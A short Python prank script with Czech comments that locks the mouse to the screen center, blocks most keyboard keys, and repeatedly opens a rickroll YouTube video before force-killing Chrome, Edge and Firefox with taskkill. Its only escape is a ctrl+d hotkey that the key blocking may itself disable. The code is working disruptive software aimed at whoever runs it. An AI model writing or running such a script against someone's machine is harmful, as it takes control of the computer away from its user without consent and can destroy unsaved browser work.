import pyautogui as p
import time as t
import os
import webbrowser as w
import keyboard
import threading

p.FAILSAFE = False

stopKey = "ctrl+d"  # Hotkey, který zastaví script
maxX, maxY = p.size()

stop_flag = False  # Globální stop flag

def lock_input():
    while not stop_flag:
        p.moveTo(maxX / 2, maxY / 2)  # Zamčení kurzoru
        for i in range(150):  
            keyboard.block_key(i)  # Zamčení klávesnice
        t.sleep(0.1)  # Menší pauza kvůli vytížení CPU

def rickroll():
    global stop_flag
    while not stop_flag:
        w.open("https://www.youtube.com/watch?v=iik25wqIuFo")
        t.sleep(4)  # Pauza pro načtení Youtube

        p.click()
        t.sleep(7) # Celkem 11 sekund wait

        # Zavření běžných prohlížečů
        os.system("taskkill /im chrome.exe /f")
        os.system("taskkill /im msedge.exe /f")
        os.system("taskkill /im firefox.exe /f")

def stop_script():
    global stop_flag
    while True:
        if keyboard.is_pressed(stopKey):
            print("Zastavuji script...")
            stop_flag = True
            os._exit(0)

threading.Thread(target=lock_input, daemon=True).start()
threading.Thread(target=rickroll, daemon=True).start()
threading.Thread(target=stop_script, daemon=True).start()

while not stop_flag:
    t.sleep(1)
